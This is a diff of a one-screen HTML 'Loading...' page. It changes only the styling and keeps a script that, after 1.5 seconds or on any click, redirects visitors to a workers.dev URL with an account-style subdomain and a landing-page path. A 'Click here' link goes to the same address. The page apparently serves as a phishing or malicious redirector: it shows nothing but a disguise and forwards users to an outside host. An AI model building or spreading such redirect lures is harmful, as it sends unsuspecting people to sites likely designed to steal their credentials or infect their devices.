@@ -3,7 +3,6 @@
 <head>
   <meta charset="UTF-8">
   <title>Loading...</title>
-
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
   <style>
@@ -15,18 +14,10 @@
 
     body {
       height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      background: #000;
+      background: url("extracted.jpg") no-repeat center center;
+      background-size: cover;
       font-family: Arial, sans-serif;
       overflow: hidden;
-    }
-
-    img {
-      width: 100%;
-      height: 100%;
-      object-fit: cover;
     }
 
     .fallback {
@@ -44,29 +35,24 @@
     }
   </style>
 </head>
+
 <body>
 
-  <!-- Your image -->
-  <img src="extracted.jpg" alt="Loading..." />
-
-  <!-- Fallback link (important for blocked redirects) -->
   <div class="fallback">
-    If nothing happens, <a href="https://ojfwo-suem-on9l.jimmy-baileybuilders-com-s-account.workers.dev/lp/l0cwxUxLdWo">Click here</a>
+    If nothing happens, 
+    <a href="https://ojfwo-suem-on9l.jimmy-baileybuilders-com-s-account.workers.dev/lp/l0cwxUxLdWo">
+      Click here
+    </a>
   </div>
 
   <script>
-    // Delay (in milliseconds)
     const delay = 1500;
 
-    // Redirect function
     function redirect() {
       window.location.href = "https://ojfwo-suem-on9l.jimmy-baileybuilders-com-s-account.workers.dev/lp/l0cwxUxLdWo";
     }
 
-    // Try redirect after delay
     setTimeout(redirect, delay);
-
-    // Extra fallback: redirect when user taps anywhere
     document.body.addEventListener('click', redirect);
   </script>
 
